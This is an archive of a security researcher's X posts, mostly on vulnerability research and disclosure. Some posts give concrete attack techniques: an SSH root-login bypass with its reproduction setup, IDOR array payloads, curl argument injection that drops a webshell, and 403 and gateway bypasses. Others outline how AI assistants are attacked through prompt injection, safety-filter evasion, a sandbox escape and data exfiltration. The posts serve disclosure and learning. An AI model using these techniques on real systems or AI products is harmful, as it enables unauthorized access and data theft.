# @0xacb — full verbatim X archive (security-relevant posts)

_Generated 2026-11-15 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._

- Posts in this file: 218
- Conversations/threads: 181
- Oldest post captured: 2014-01-05
- Newest post captured: 2026-11-13


---

## 2026-11-13 · Post · Worst possible day for Nvidia to be on Outlook [pic.x.com/6qfrBJQSDf]


### Post — @0xacb — 2026-11-13 02:41 UTC (2026-11-13 03:41 WAT)

- URL: https://x.com/0xacb/status/2121070916549390523
- Metrics (at fetch): bookmark 5, impression 1128, like 13, quote 0, reply 3, retweet 0

> Worst possible day for Nvidia to be on Outlook [pic.x.com/6qfrBJQSDf]

**Media:**
- photo: https://pbs.twimg.com/media/HW-N-YzWwAAM-D9.jpg — alt text: "$ dig +short MX nvidia.com
10 nvidia-com.mail.protection.outlook.com."


---

## 2026-11-05 · Thread · Just reproduced sshole (CVE-2026-123158), beautifully simple bug by @kultekin


### Post — @0xacb — 2026-11-05 16:58 UTC (2026-11-05 17:58 WAT)

- URL: https://x.com/0xacb/status/2118387414527832065
- Metrics (at fetch): bookmark 76, impression 43543, like 186, quote 10, reply 14, retweet 26

> Just reproduced sshole (CVE-2026-123158), beautifully simple bug by @kultekin
>
> Needs password auth on and no PAM, but you can ssh as root into an unpatched Alpine box with any 257+ byte password.
>
> musl crypt() returns "*" for any password over 256 bytes. a locked account's shadow field is also "*". sshd compares them and they match.
>
> fix: openssh 10.6p2

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2118387278993141762/pu/img/jk-Q-te9-kVEaG-8.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-11-05 16:59 UTC (2026-11-05 17:59 WAT)

- URL: https://x.com/0xacb/status/2118387852539232756
- Metrics (at fetch): bookmark 0, impression 1336, like 0, quote 0, reply 1, repost 1

> repro: alpine:3.21, upstream OpenSSH V_9_9_P2 built from source (the current alpine package is already patched).
> PermitRootLogin yes, PasswordAuthentication yes, root locked with *, one other user with a real hash. A * account needs one wrong try first


---

## 2026-11-04 · Post · RFC 2047 "encoded-word" is so cool!


Tags (automatic): Request smuggling / desync


### Post — @0xacb — 2026-11-04 17:00 UTC (2026-11-04 18:00 WAT)

- URL: https://x.com/0xacb/status/2118025513574830216
- Metrics (at fetch): bookmark 67, impression 3449, like 81, quote 0, reply 1, retweet 9

> RFC 2047 "encoded-word" is so cool!
>
> It lets you smuggle encoded payloads into email addresses and the craziest thing is that some parsers decode it before validation 👇
>
> Shout out to @garethheyes for this 🔥 [pic.x.com/Vi8ZmTOpxl]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2118025368204386304/pu/img/IAcnEKXoSNE539ZA.jpg — no alt text provided by author


---

## 2026-11-03 · Thread · I was reading a blog on the "AI RCEssion" today, and it captures what happened during October: AI is


Tags (automatic): Race condition, AI-assisted hunting


### Post — @0xacb — 2026-11-03 15:59 UTC (2026-11-03 16:59 WAT)

- URL: https://x.com/0xacb/status/2117647871285584365
- Metrics (at fetch): bookmark 8, impression 2046, like 25, quote 0, reply 4, retweet 3

> I was reading a blog on the "AI RCEssion" today, and it captures what happened during October: AI isn't creating new bugs, it's just auditing 10-to-20-year-old tech debt faster than manual teams can keep up.
>
> Adversaries have automated their auditing, which means defenders must do the same.
>
> That's why we built Zero, @Ethiack's public record of emerging 0-days. It tracks the earliest public signals of new vulnerabilities so you can validate real exploitability before attackers win the race.
>
> Links to the blog and Ethiack Zero below 👇

**Media:**
- photo: https://pbs.twimg.com/media/HWNlg9NXkAEohcg.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-11-03 15:59 UTC (2026-11-03 16:59 WAT)

- URL: https://x.com/0xacb/status/2117647873244360954
- Metrics (at fetch): bookmark 5, impression 412, like 4, quote 0, reply 0, repost 1

> https://blog.tedivm.com/rants/2026/10/the-ai-rcession-has-begun/
>
> https://zero.ethiack.com/

**Links in post:** https://blog.tedivm.com/rants/2026/10/the-ai-rcession-has-begun/, https://zero.ethiack.com/


---

## 2026-11-02 · Post · This @bishopfox tool is next level! 🚀


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-11-02 07:25 UTC (2026-11-02 08:25 WAT)

- URL: https://x.com/0xacb/status/2117156243588497749
- Metrics (at fetch): bookmark 171, impression 10506, like 175, quote 1, reply 2, repost 25

> This @bishopfox tool is next level! 🚀
>
> Eyeballer uses AI to analyze screenshots and sorts them into categories based on appearance, including:
> 👀 Old-looking pages,
> 👀 Login pages,
> 👀 404 responses
> 👀 Web apps
> 👀 Parked domains
>
> Get your eyeballs around this👇 [pic.x.com/k63khXTTdd]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2117156083387011072/pu/img/eiUU7IHWis8MaP7F.jpg — no alt text provided by author


---

## 2026-10-30 · Thread · CTFs ain't dead!


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-10-30 22:24 UTC (2026-10-30 23:24 WAT)

- URL: https://x.com/0xacb/status/2116295325681857004
- Metrics (at fetch): bookmark 26, impression 17951, like 244, quote 2, reply 5, retweet 23

> CTFs ain't dead!
>
> We organized a speed pwning CTF at @Bsideslisbon. No AI, human-only.
>
> Congrats to the winners!
>
> 1st- s1gn3rs
> 2nd- h11p13
> 3rd- tmv11 [pic.x.com/XH7hXh6vYh]

**Media:**
- photo: https://pbs.twimg.com/media/HV6XP0IWcAACUOv.png — no alt text provided by author
- photo: https://pbs.twimg.com/media/HV6XXf0XEAEa3IO.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-10-30 23:23 UTC (2026-10-31 00:23 WAT)

- URL: https://x.com/0xacb/status/2116310110033031544
- Metrics (at fetch): bookmark 1, impression 1058, like 14, quote 0, reply 2, retweet 0

> @Smshrimant @Bsideslisbon Players livestreamed their screens on-site!


---

## 2026-10-30 · Reply · @jackhcable Congrats Jack! 🔥


### Post — @0xacb — 2026-10-30 13:44 UTC (2026-10-30 14:44 WAT)

- URL: https://x.com/0xacb/status/2116164438591996319
- Metrics (at fetch): bookmark 0, impression 167, like 1, quote 0, reply 0, retweet 0

> @jackhcable Congrats Jack! 🔥


---

## 2026-10-27 · Thread · Attackers often exploit new vulnerabilities before defenders can react, sometimes before the vulnera


### Post — @0xacb — 2026-10-27 10:51 UTC (2026-10-27 11:51 WAT)

- URL: https://x.com/0xacb/status/2115033525975986327
- Metrics (at fetch): bookmark 5, impression 1145, like 6, quote 0, reply 4, retweet 1

> Attackers often exploit new vulnerabilities before defenders can react, sometimes before the vulnerability even gets a public ID (a CVE).
>
> In the first half of 2026, 487 vulnerabilities were listed as exploited. For 137 of them (>25%), the exploitation record existed on or before the day the CVE was published.
>
> We built Ethiack Zero to track emerging vulnerabilities from the first public signal (a patch, a GitHub advisory, news, a blog post) and validate actual exploitability before the CVE is officially published.
>
> Check it out below👇

**Media:**
- photo: https://pbs.twimg.com/media/HVobqtVWQAATu-i.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-10-27 10:51 UTC (2026-10-27 11:51 WAT)

- URL: https://x.com/0xacb/status/2115033527750111448
- Metrics (at fetch): bookmark 3, impression 399, like 0, quote 0, reply 0, repost 0

> https://zero.ethiack.com/

**Links in post:** https://zero.ethiack.com/


---

## 2026-10-26 · Thread · Live hardware hacking is coming to @BSidesLisbon.


Tags (automatic): Path normalization


### Post — @0xacb — 2026-10-26 10:21 UTC (2026-10-26 11:21 WAT)

- URL: https://x.com/0xacb/status/2114663615823237146
- Metrics (at fetch): bookmark 0, impression 792, like 9, quote 0, reply 1, retweet 0

> Live hardware hacking is coming to @BSidesLisbon.
>
> Get ready for the @Ethiack SOHO Smashup on Friday, October 30! Inspired by Pwn2Own, we’re dropping real, aging office equipment right on the floor:
> • One office router
> • One printer
>
> The challenge: Hack them live in the lounge [pic.x.com/wFhwfG1NZq]

**Media:**
- photo: https://pbs.twimg.com/media/HVjLO3IXAAAfWby.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-10-26 10:21 UTC (2026-10-26 11:21 WAT)

- URL: https://x.com/0xacb/status/2114663617702384115
- Metrics (at fetch): bookmark 0, impression 310, like 0, quote 0, reply 0, retweet 0

> @Bsideslisbon @ethiack https://www.bsideslisbon.org/2026/ctf/

**Links in post:** https://www.bsideslisbon.org/2026/ctf/


---

## 2026-10-23 · Post · When everything is 2shell, nothing is 2shell


### Post — @0xacb — 2026-10-23 23:11 UTC (2026-10-24 00:11 WAT)

- URL: https://x.com/0xacb/status/2113770260474233271
- Metrics (at fetch): bookmark 0, impression 1210, like 19, quote 0, reply 0, retweet 0

> When everything is 2shell, nothing is 2shell


---

## 2026-10-22 · Post · 12 years not 12 hours btw https://twitter.com/ns123abc/status/2113005977335464187


### Post — @0xacb — 2026-10-22 00:59 UTC (2026-10-22 01:59 WAT)

- URL: https://x.com/0xacb/status/2113072634024149193
- Metrics (at fetch): bookmark 1, impression 1555, like 1, quote 0, reply 1, retweet 0

> 12 years not 12 hours btw https://twitter.com/ns123abc/status/2113005977335464187

**Links in post:** https://twitter.com/ns123abc/status/2113005977335464187

**Quoted post** 2113005977335464187: not readable via the API (deleted, private, or withheld).


---

## 2026-10-20 · Post · We’re continuously reversing the emerging 0days that matter most, sometimes before they get a CVE, a


### Post — @0xacb — 2026-10-20 14:47 UTC (2026-10-20 15:47 WAT)

- URL: https://x.com/0xacb/status/2112556367739257001
- Metrics (at fetch): bookmark 6, impression 2173, like 17, quote 0, reply 1, retweet 0

> We’re continuously reversing the emerging 0days that matter most, sometimes before they get a CVE, and publishing how fast we validate them vs how fast attackers exploit them.
>
> 👉 https://zero.ethiack.com https://twitter.com/ethiack/status/2112551591416930545

**Links in post:** https://zero.ethiack.com, https://twitter.com/ethiack/status/2112551591416930545

**Quoted post (full text):**

    #### Quoted post — @1494707118712184832 — 2026-10-20 14:28 UTC (2026-10-20 15:28 WAT)
    
    - URL: https://x.com/1494707118712184832/status/2112551591416930545
    - Metrics (at fetch): bookmark 16, impression 6925, like 29, quote 3, reply 1, repost 6
    
    > Yesterday we asked: what if you could turn back the clock?
    >
    > We can’t, but we can see it sooner.
    >
    > Ethiack Zero is live: a public record of emerging 0-days. Open feed, API, MCP and methodology. Check our numbers and tell us what’s missing.
    >
    > https://zero.ethiack.com [pic.x.com/xHIR4OQyd3]
    
    **Media:**
    - video: https://pbs.twimg.com/amplify_video_thumb/2112550603167608835/img/7dnfhULqq1DXQZio.jpg — no alt text provided by author
    
    **Links in post:** https://zero.ethiack.com
    


---

## 2026-10-15 · Post · BSides Lisbon 2026 is coming, and @Ethiack is running the CTF!


### Post — @0xacb — 2026-10-15 14:17 UTC (2026-10-15 15:17 WAT)

- URL: https://x.com/0xacb/status/2110736819633508747
- Metrics (at fetch): bookmark 0, impression 986, like 9, quote 0, reply 1, retweet 0

> BSides Lisbon 2026 is coming, and @Ethiack is running the CTF!
>
> See you on October 29th. [pic.x.com/cfAJABu0tx]

**Media:**
- photo: https://pbs.twimg.com/media/HUrX811XsAEtcqy.jpg — no alt text provided by author


---

## 2026-10-02 · Thread · In our KindaRails2Shell research, we reused a signed thumbnail key to process a crafted upload.


### Post — @0xacb — 2026-10-02 10:20 UTC (2026-10-02 11:20 WAT)

- URL: https://x.com/0xacb/status/2105966131760538012
- Metrics (at fetch): bookmark 3, impression 1344, like 7, quote 0, reply 1, retweet 2

> In our KindaRails2Shell research, we reused a signed thumbnail key to process a crafted upload.
>
> Active Storage signs the variation_key for the transformation separately from the blob ID. A key from a public thumbnail could be used with the signed ID of our file.
>
> That made the


### Thread part 2 — @0xacb — 2026-10-02 10:20 UTC (2026-10-02 11:20 WAT)

- URL: https://x.com/0xacb/status/2105966133538877767
- Metrics (at fetch): bookmark 4, impression 527, like 0, quote 0, reply 0, retweet 2

> Full walkthrough here 👇  
> https://ethiack.com/info-hub/research/kindarails2shell-how-a-matlab-file-reads-your-secrets-and-pops-a-shell-on-ruby-on-rails

**Links in post:** https://ethiack.com/info-hub/research/kindarails2shell-how-a-matlab-file-reads-your-secrets-and-pops-a-shell-on-ruby-on-rails


---

## 2026-10-01 · Thread · @castilho101 breaks down the discovery and exploitation of a Pre-Auth Remote Code Execution flaw in 


Tags (automatic): RCE


### Post — @0xacb — 2026-10-01 10:02 UTC (2026-10-01 11:02 WAT)

- URL: https://x.com/0xacb/status/2105599177078026697
- Metrics (at fetch): bookmark 4, impression 983, like 5, quote 0, reply 2, retweet 3

> @castilho101 breaks down the discovery and exploitation of a Pre-Auth Remote Code Execution flaw in GeoNetwork.
>
> We recently disclosed 4 CVEs on it:
>
> CVE-2026-63219 - Unauthenticated file upload via missing Authorization on formatter Upload Endpoint
> CVE-2026-55864 -


### Thread part 2 — @0xacb — 2026-10-01 10:02 UTC (2026-10-01 11:02 WAT)

- URL: https://x.com/0xacb/status/2105599178411749449
- Metrics (at fetch): bookmark 1, impression 226, like 1, quote 0, reply 0, retweet 0

> @castilho101 https://ethiack.com/info-hub/research/geonetwork-preauth-RCE

**Links in post:** https://ethiack.com/info-hub/research/geonetwork-preauth-RCE


---

## 2026-09-30 · Thread · Turns out those Unicode dashes are actually useful.


### Post — @0xacb — 2026-09-30 09:29 UTC (2026-09-30 10:29 WAT)

- URL: https://x.com/0xacb/status/2105228648164847843
- Metrics (at fetch): bookmark 70, impression 6416, like 114, quote 1, reply 4, retweet 10

> Turns out those Unicode dashes are actually useful.
>
> Filter blocks "-"? Send full-width "－" instead. Windows converts it back to "-" inside curl.exe, injecting a -o argument that drops a webshell. [pic.x.com/PGueUL78oF]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2105228498977566720/pu/img/CpOi-ryFhPCo1lsO.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-09-30 09:29 UTC (2026-09-30 10:29 WAT)

- URL: https://x.com/0xacb/status/2105228649829962229
- Metrics (at fetch): bookmark 1, impression 410, like 3, quote 0, reply 0, retweet 0

> Great research by @orange_8361 / Devcore
>
> https://worst.fit

**Links in post:** https://worst.fit


---

## 2026-09-29 · Thread · Have you looked at localName when testing an HTML filter?


### Post — @0xacb — 2026-09-29 09:05 UTC (2026-09-29 10:05 WAT)

- URL: https://x.com/0xacb/status/2104860197713854817
- Metrics (at fetch): bookmark 2, impression 1376, like 8, quote 0, reply 1, retweet 0

> Have you looked at localName when testing an HTML filter?
>
> A tag name that looks useless as markup can come back from the browser as a transformed string. If an event handler reads that value, a payload the filter never saw as JavaScript may become code later.
>
> @garethheyes


### Thread part 2 — @0xacb — 2026-09-29 09:05 UTC (2026-09-29 10:05 WAT)

- URL: https://x.com/0xacb/status/2104860199060148406
- Metrics (at fetch): bookmark 2, impression 379, like 4, quote 0, reply 0, retweet 2

> @garethheyes Full blog 👇
> https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently

**Links in post:** https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently


---

## 2026-09-28 · Post · Full writeup 👇


### Post — @0xacb — 2026-09-28 09:48 UTC (2026-09-28 10:48 WAT)

- URL: https://x.com/0xacb/status/2104508503998029931
- Metrics (at fetch): bookmark 2, impression 352, like 5, quote 0, reply 0, retweet 0

> Full writeup 👇
> https://ethiack.com/info-hub/research/kindarails2shell-how-a-matlab-file-reads-your-secrets-and-pops-a-shell-on-ruby-on-rails

**Links in post:** https://ethiack.com/info-hub/research/kindarails2shell-how-a-matlab-file-reads-your-secrets-and-pops-a-shell-on-ruby-on-rails


---

## 2026-09-15 · Thread · Some security controls, such as auth checks, rate limiting, WAF rules, and IP allowlisting are often


### Post — @0xacb — 2026-09-15 09:31 UTC (2026-09-15 10:31 WAT)

- URL: https://x.com/0xacb/status/2099793106732277929
- Metrics (at fetch): bookmark 22, impression 1992, like 35, quote 0, reply 4, retweet 1

> Some security controls, such as auth checks, rate limiting, WAF rules, and IP allowlisting are often implemented with a gateway.
>
> If you're able to discover the origin host and it accepts requests directly, you can bypass all of that by sending your requests straight to the


### Thread part 2 — @0xacb — 2026-09-15 09:31 UTC (2026-09-15 10:31 WAT)

- URL: https://x.com/0xacb/status/2099793112545603697
- Metrics (at fetch): bookmark 0, impression 178, like 2, quote 0, reply 1, retweet 0

> If that doesn't work, there's active recon.
>
> There are two ways to do this: via subdomains or via IP addresses with vhosts.
>
> To check subdomains, just do your usual subdomain enumeration and then check each subdomain to see if any of them respond the same as the gateway.


---

## 2026-09-14 · Thread · Been testing the IDOR trick where you wrap the identifier in an array, in Node JS.


Tags (automatic): IDOR / BOLA


### Post — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439126617473210
- Metrics (at fetch): bookmark 268, impression 11863, like 321, quote 0, reply 7, retweet 32

> Been testing the IDOR trick where you wrap the identifier in an array, in Node JS.
>
> You are 123, victim is 124.
> {"user_id": [124, 123]}
>
> The ORM doesn't pick the first element. Sequelize and Mongoose turn it into WHERE id IN (124, 123) and can write both rows.


### Thread part 2 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439128202899609
- Metrics (at fetch): bookmark 5, impression 1250, like 10, quote 0, reply 2, retweet 0

> This only works if the middleware checks whether your ID is in the array. These pass:
>
> [].concat(id).includes(123)
> [].concat(id).some(x =&gt; x == 123)
>
> Strict == and === both reject [124,123]. So does Number().


### Thread part 3 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439129536741754
- Metrics (at fetch): bookmark 2, impression 1009, like 10, quote 0, reply 1, retweet 0

> One that surprised me, though it's already known: parseInt([123,124]) === 123 is true.
>
> The array becomes the string "123,124" and parseInt stops at the comma. So put your own ID first to get past a parseInt check.


### Thread part 4 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439130937627039
- Metrics (at fetch): bookmark 0, impression 677, like 4, quote 0, reply 1, retweet 0

> Then it's up to the ORM:
>
> Sequelize -&gt; IN (124,123), both rows written
> Mongoose -&gt; implicit $in, both rows written
> TypeORM -&gt; throws RangeError
> Knex -&gt; throws on bind
> Prisma -&gt; throws, Expected Int, provided (Int, Int)


### Thread part 5 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439132283965627
- Metrics (at fetch): bookmark 0, impression 562, like 3, quote 0, reply 1, retweet 0

> You don't need a JSON body either. Duplicate params gave me an array in every Express config I tried:
>
> user_id=124&amp;user_id=123 -&gt; ["124","123"]
>
> They arrive as strings, so includes(123) fails, but some(x =&gt; x == 123) still passes and Sequelize still fires: IN ('124','123')


### Thread part 6 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439133609296120
- Metrics (at fetch): bookmark 0, impression 509, like 1, quote 0, reply 1, retweet 0

> You always write to your own row too. [124] alone would hit only the victim, but the middleware rejects it because your ID isn't there.
>
> To get past the check you have to include yourself, and the ORM writes to everything in the list.


### Thread part 7 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439134918017468
- Metrics (at fetch): bookmark 0, impression 633, like 0, quote 0, reply 2, retweet 0

> On the read path, findOne returns your own row whatever the order. The issue is on findAll/find, which returns both.
>
> Mongo operators like {"$in":[124]} can hit only the victim, but fail every middleware check I tested. Only reachable where the field isn't inspected.


### Thread part 8 — @0xacb — 2026-09-14 10:04 UTC (2026-09-14 11:04 WAT)

- URL: https://x.com/0xacb/status/2099439136415297841
- Metrics (at fetch): bookmark 0, impression 591, like 0, quote 0, reply 0, retweet 0

> Tested on sequelize 6.37, mongoose 9.9, typeorm 1.1, knex 3.3, prisma 7.10, express 5.2


---

## 2026-09-09 · Post · 🎧 Now playing: 403 Bypass (Castilho Remix)


### Post — @0xacb — 2026-09-09 22:28 UTC (2026-09-09 23:28 WAT)

- URL: https://x.com/0xacb/status/2097814507703652830
- Metrics (at fetch): bookmark 56, impression 5802, like 96, quote 0, reply 1, retweet 5

> 🎧 Now playing: 403 Bypass (Castilho Remix)
>
> /admin → 403
> /admin.data → 200 https://twitter.com/castilho101/status/2097261862609977559

**Links in post:** https://twitter.com/castilho101/status/2097261862609977559

**Quoted post** 2097261862609977559: not readable via the API (deleted, private, or withheld).


---

## 2026-09-09 · Thread · Now if someone fixes it like:


### Post — @0xacb — 2026-09-09 09:50 UTC (2026-09-09 10:50 WAT)

- URL: https://x.com/0xacb/status/2097623690519236640
- Metrics (at fetch): bookmark 0, impression 103, like 0, quote 0, reply 1, retweet 0

> Now if someone fixes it like:
>
> username.ToLower() == "admin" stops ADMIN, but lets 'admin␣' through.
>
> Moving the column to a CS collation also stops ADMIN, and also lets 'admin␣' through.
>
> Two different fixes, same half of the bug left open.


### Thread part 2 — @0xacb — 2026-09-09 09:50 UTC (2026-09-09 10:50 WAT)

- URL: https://x.com/0xacb/status/2097623691853009038
- Metrics (at fetch): bookmark 0, impression 98, like 0, quote 0, reply 1, retweet 0

> Other things I tested:
>
> Only the space char. Tab, newline and CR still count
> Leading spaces still count
> = and LIKE disagree: 'admin' = 'admin␣' is true, 'admin' LIKE 'admin␣' is false
> A UNIQUE index under CI rejects ADMIN as a duplicate of admin, so it's a lookup bug not a


---

## 2026-09-07 · Thread · This is how user data can be exposed via prompt injection, explained by @wunderwuzzi23: [pic.x.com/Z


### Post — @0xacb — 2026-09-07 09:06 UTC (2026-09-07 10:06 WAT)

- URL: https://x.com/0xacb/status/2096887734870634830
- Metrics (at fetch): bookmark 88, impression 5477, like 105, quote 1, reply 2, retweet 20

> This is how user data can be exposed via prompt injection, explained by @wunderwuzzi23: [pic.x.com/Z4vK0Q9zaX]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2096887579421396993/pu/img/tq-29wCJXINlZKtk.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-09-07 09:06 UTC (2026-09-07 10:06 WAT)

- URL: https://x.com/0xacb/status/2096887736225378334
- Metrics (at fetch): bookmark 5, impression 1448, like 10, quote 0, reply 0, retweet 3

> @wunderwuzzi23 Watch the full talk:
> https://t.co/3vxXMFKLDM


---

## 2026-09-02 · Thread · @vbCrLf How it works:


Tags (automatic): SSRF


### Post — @0xacb — 2026-09-02 09:42 UTC (2026-09-02 10:42 WAT)

- URL: https://x.com/0xacb/status/2095084939557343689
- Metrics (at fetch): bookmark 1, impression 615, like 2, quote 0, reply 1, retweet 0

> @vbCrLf How it works:
>
> 1. A Word doc with a hidden prompt injection gets uploaded to Copilot
> 2. Launder intent (using a gzip payload) to bypass safety filters
> 3. Escalate to root inside the sandbox
> 4. Execute a full container-to-host escape (CVE-2026-32193)


### Thread part 2 — @0xacb — 2026-09-02 09:42 UTC (2026-09-02 10:42 WAT)

- URL: https://x.com/0xacb/status/2095084943214834093
- Metrics (at fetch): bookmark 10, impression 468, like 5, quote 0, reply 0, retweet 0

> @vbCrLf Bug was in Azure Container Runtime, so AKS and Container Apps were also affected. Any SSRF that can reach the node's localhost = root on the node.
>
> 5 issues, 4 Microsoft products, $48k bounty.
>
> Cool research by Ori Lahav 👇
>
> https://zerolabs.rubrik.com/blog/breaking-m365-copilot-sandbox-chatmate

**Links in post:** https://zerolabs.rubrik.com/blog/breaking-m365-copilot-sandbox-chatmate


---

## 2026-09-01 · Thread · New unauth RCE in GeoNetwork


Tags (automatic): RCE


### Post — @0xacb — 2026-09-01 17:22 UTC (2026-09-01 18:22 WAT)

- URL: https://x.com/0xacb/status/2094838368269996350
- Metrics (at fetch): bookmark 44, impression 9867, like 108, quote 0, reply 1, retweet 16

> New unauth RCE in GeoNetwork
> Popped and reported by @castilho101 💥
>
> CVE-2026-63219, CVE-2026-55864, CVE-2026-57582, CVE-2026-58400 [pic.x.com/aXkS1L27vw] https://twitter.com/castilho101/status/2094719091072196821

**Media:**
- video: https://pbs.twimg.com/amplify_video_thumb/2094838290968948738/img/k4RViaGuWTJq3icb.jpg — no alt text provided by author

**Links in post:** https://twitter.com/castilho101/status/2094719091072196821

**Quoted post** 2094719091072196821: not readable via the API (deleted, private, or withheld).


### Thread part 2 — @0xacb — 2026-09-01 17:22 UTC (2026-09-01 18:22 WAT)

- URL: https://x.com/0xacb/status/2094838370463604992
- Metrics (at fetch): bookmark 2, impression 546, like 2, quote 0, reply 0, retweet 0

> Writeup: https://ethiack.com/info-hub/research/geonetwork-preauth-RCE

**Links in post:** https://ethiack.com/info-hub/research/geonetwork-preauth-RCE


---

## 2026-08-31 · Thread · IDOR to image-based data exfiltration on an AI chat agent.


Tags (automatic): IDOR / BOLA, AI-assisted hunting


### Post — @0xacb — 2026-08-31 09:21 UTC (2026-08-31 10:21 WAT)

- URL: https://x.com/0xacb/status/2094354825945170336
- Metrics (at fetch): bookmark 116, impression 7783, like 151, quote 0, reply 3, retweet 25

> IDOR to image-based data exfiltration on an AI chat agent.
>
> Here’s a clip from @monkehack’s talk, explaining how they did it: [pic.x.com/Mku8Q0IdZ5]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2094354648605786112/pu/img/3ze5tOS08xkJKP4f.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-08-31 09:21 UTC (2026-08-31 10:21 WAT)

- URL: https://x.com/0xacb/status/2094354827824296352
- Metrics (at fetch): bookmark 5, impression 584, like 3, quote 0, reply 0, retweet 0

> @monkehack Check out the full video on Ethiack’s channel:
> https://www.youtube.com/watch?v=6j177rW8-nA

**Links in post:** https://www.youtube.com/watch?v=6j177rW8-nA


---

## 2026-08-24 · Thread · This is how @0xLupin bypassed the supply chain security of major companies like Google, Salesforce, 


Tags (automatic): Dependency confusion / supply chain


### Post — @0xacb — 2026-08-24 09:43 UTC (2026-08-24 10:43 WAT)

- URL: https://x.com/0xacb/status/2091823748152238482
- Metrics (at fetch): bookmark 55, impression 4435, like 63, quote 0, reply 1, retweet 13

> This is how @0xLupin bypassed the supply chain security of major companies like Google, Salesforce, Netflix, and many others.
>
> Here’s the clip: [pic.x.com/MNioWfwptV]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2091823688173723648/pu/img/PbPcdnEsH7uFMOMS.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-08-24 09:43 UTC (2026-08-24 10:43 WAT)

- URL: https://x.com/0xacb/status/2091823749620199929
- Metrics (at fetch): bookmark 5, impression 731, like 9, quote 0, reply 0, retweet 1

> @0xLupin Check out the full video on Ethiack’s channel:
> https://www.youtube.com/watch?v=SIIIrTpN09U

**Links in post:** https://www.youtube.com/watch?v=SIIIrTpN09U


---

## 2026-08-19 · Thread · The models that look bad solo aren't bad executors, they're usually bad planners for security work. 


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-08-19 14:35 UTC (2026-08-19 15:35 WAT)

- URL: https://x.com/0xacb/status/2090085257483575328
- Metrics (at fetch): bookmark 24, impression 5786, like 36, quote 0, reply 3, retweet 1

> The models that look bad solo aren't bad executors, they're usually bad planners for security work. Swap in Opus 5 as Strategizer and GPT 5.6 Terra jumps to ~86 cumulative F1 at 45% of the cost. https://t.co/dEuaZfc9lf

**Quoted post** 2090075225333383476: not readable via the API (deleted, private, or withheld).


### Thread part 2 — @0xacb — 2026-08-19 17:00 UTC (2026-08-19 18:00 WAT)

- URL: https://x.com/0xacb/status/2090121709118525558
- Metrics (at fetch): bookmark 4, impression 449, like 5, quote 0, reply 0, retweet 1

> Blog post: https://t.co/pXog7cIhYP


---

## 2026-08-14 · Thread · Using SHA collision to trick an AI for a $10k bounty.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-08-14 15:58 UTC (2026-08-14 16:58 WAT)

- URL: https://x.com/0xacb/status/2088294197778329649
- Metrics (at fetch): bookmark 158, impression 9317, like 161, quote 0, reply 1, retweet 19

> Using SHA collision to trick an AI for a $10k bounty.
>
> Really interesting technique by my buddy @0xLupin: [pic.x.com/8TYGXA1KRM]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2088294090794270720/pu/img/699HJbvWfPTRi346.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-08-14 15:58 UTC (2026-08-14 16:58 WAT)

- URL: https://x.com/0xacb/status/2088294199435149542
- Metrics (at fetch): bookmark 8, impression 747, like 5, quote 0, reply 0, retweet 1

> @0xLupin Check out the full video on Ethiack’s channel:
> https://www.youtube.com/watch?v=SIIIrTpN09U

**Links in post:** https://www.youtube.com/watch?v=SIIIrTpN09U


---

## 2026-08-13 · Thread · This is how @monkehack (with @Rhynorater, @0xLupin, @rez0__ ) used prompt injection to hack the Gemi


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-08-13 13:44 UTC (2026-08-13 14:44 WAT)

- URL: https://x.com/0xacb/status/2087898017886019999
- Metrics (at fetch): bookmark 87, impression 6316, like 118, quote 0, reply 2, retweet 14

> This is how @monkehack (with @Rhynorater, @0xLupin, @rez0__ ) used prompt injection to hack the Gemini mobile app: [pic.x.com/FTAjG4B9xr]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2087897825929482240/pu/img/gSXfIU-v7FFI66_V.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-08-13 13:44 UTC (2026-08-13 14:44 WAT)

- URL: https://x.com/0xacb/status/2087898019282763909
- Metrics (at fetch): bookmark 11, impression 825, like 9, quote 0, reply 0, retweet 4

> @monkehack @Rhynorater @0xLupin @rez0__ Full talk on Ethiack's channel 👇
> https://www.youtube.com/watch?v=6j177rW8-nA

